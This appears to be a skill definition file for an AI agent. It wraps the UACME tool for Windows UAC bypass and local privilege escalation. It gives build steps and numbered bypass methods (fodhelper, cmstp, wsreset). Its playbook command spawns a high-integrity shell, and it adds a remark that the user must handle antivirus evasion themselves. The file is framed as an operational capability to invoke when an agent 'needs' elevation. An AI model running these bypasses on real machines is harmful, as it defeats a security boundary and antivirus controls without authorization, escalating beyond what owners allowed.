---
name: uacme-uac-bypass
description: "UACME: Standard user UAC bypass privilege escalation. Signals: windows privilege escalation, UAC bypass, parameterized delivery execution."
zh-signals: "UACME: 标准用户绕过 UAC 提权。信号:windows提权,uac绕过,带参数的投递执行。"
when-to-use: >-
  Use on Windows when running as a standard user and you need to bypass UAC to
  execute a command with high integrity; select a method ID compatible with the
  target Windows version, and note output may be flagged by AV.
---

# UACME

- Attack Category: C17 Windows Local Privilege Escalation
- Upstream Repository: https://github.com/hfiref0x/UACME
- Upstream License: BSD-2-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/hfiref0x/UACME && cd UACME/Source && build Akagi.sln with Visual Studio
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `Akagi.exe 61 <cmd>` | Escalate and execute with method 61 (e.g. cmstp) |
| `Akagi.exe 33 cmd.exe` | fodhelper allowlist bypass |
| `Akagi.exe key [value] [cmd]` | Parameterized delivery execution |

## Attack Scenario Playbook

### Standard user bypasses UAC for privilege escalation

```bash
Akagi.exe 61 cmd.exe
# Pops a high-integrity cmd; key methods: 33 fodhelper / 61 cmstp / 70 wsreset
```

## Notes

Ships 70+ numbered UAC bypass methods; methods expire with Windows versions, so pick one that works on the target system; the output is flagged by mainstream AV, so you need to handle AV evasion yourself.
